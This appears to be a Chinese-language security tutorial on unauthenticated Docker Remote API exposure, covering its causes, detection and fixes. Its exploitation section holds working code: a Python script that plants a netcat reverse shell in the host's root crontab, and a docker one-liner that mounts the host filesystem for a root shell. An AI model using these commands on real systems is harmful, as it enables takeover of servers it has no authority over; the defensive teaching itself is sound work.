# Docker API未授权 

## **造成危害**

未进行权限验证且开放daemon-api的docker服务器可被攻击者控制服务器文件内容，严重可导致getshell等。 



## **原理**  

Docker服务器的daemon-api可以被远程进行调度管理docker，且默认没有配置权限控制。攻击者可以通过创建远程docker的方式映射虚拟机目录到宿主机目录从而获取宿主机的管理权限。

导致问题的出现一般有三种原因 



1、Docker没有使用 user namespace 进行隔离，容器内部的root用户就是宿主机的root，一旦挂载目录之后就可以root身份对宿主机进行操作。

2、Docker 服务所在组的权限过大。

3、Docker remote API没有启动ssl验证 。







## 如何寻找

扫描内网当中开启的2375端口的服务器 

然后访问 其中的  /version 目录 ，出现以下问题说明存在 该服务器存在 Docker未授权漏洞 

![20211101000535](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101000535.png)

## 如何进行利用

### 1、写入定时任务，sshkey 等信息   

下面直接使用一个脚本作为演示，脚本内容当中写入定时任务进行反弹shell

注意该演示需要出现问题的2,3两种原因  

```
import docker

client = docker.DockerClient(base_url='http://192.168.233.140:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc 192.168.233.128 4545 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```

意思是连接docker，创建了一个  alpine:latest，并且将/tmp/etc 的目录挂载到 root的/etc目录。（docker存在未授权访问的原因） 

最后执行了一条命令是写入一条回传命令到 定时任务当中 。（docker服务所在组权限过大）

最后得到的结果如下 

![20211101000602](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101000602.png)



### 2、目录映射的方式直接获得一个宿主机的interactive  shell  

在出现示例1问题的基础上，运维没有对namespace进行配置，导致攻击者可以通过创建容器的shell进行目录映射的方式直接获得一个宿主机的interactive  shell

注意该演示需要出现问题的1、3两种原因  

```
 docker -H tcp://192.168.233.140:2375 run -it -v /:/mnt alpine chroot /mnt sh
```

-H 是连接某个docker的 daemon-api 

-v 是挂载目录 格式为 **系统目录:容器目录** 

chroot的意思是设置根目录 

在这里的意思是 将挂载之后的 /mnt 作为目前的根目录 

sh 意思是获得当前的shell



这样处理之后得到的挂载文件夹才是 宿主机的文件夹，不然返回的文件夹是 本地的文件夹 

这里获取到的interactive shell 就是宿主机的shell



## 如何修复
### 登录角度

#### 1、只允许特定的IP地址进行访问

设置好ACL 不允许其他的IP进行访问  



#### 2、配置TLS认证

详见引用 Docker Remote API TLS 



### 权限角度  

#### 1、设置namespace

使宿主机当中的root账户和容器当中的root账户进行分离。这样不管是防护黑客的攻击还是防止容器用户的误操作都十分有效。



#### 2、对docker用户组的权限进行限制，不允许其 修改 ssh公钥，定时任务等

## 总结 

docker未授权的组件访问来源于创建的时候没有配置好访问所致。  

之前在内网当中曾经发现了很多关于docker未授权的服务器并且完成了闭环，但是现在存在漏洞的docker服务器又生长了出来。说明漏洞的一个常态化扫描是有必要的。 

### 引用

[Docker Remote API TLS ](https://www.jianshu.com/p/a1bdc96b4163)

[User namespace ](https://www.cnblogs.com/sparkdev/p/9614326.html)

[Docker_namespace](https://docs.docker.com/engine/security/userns-remap/)

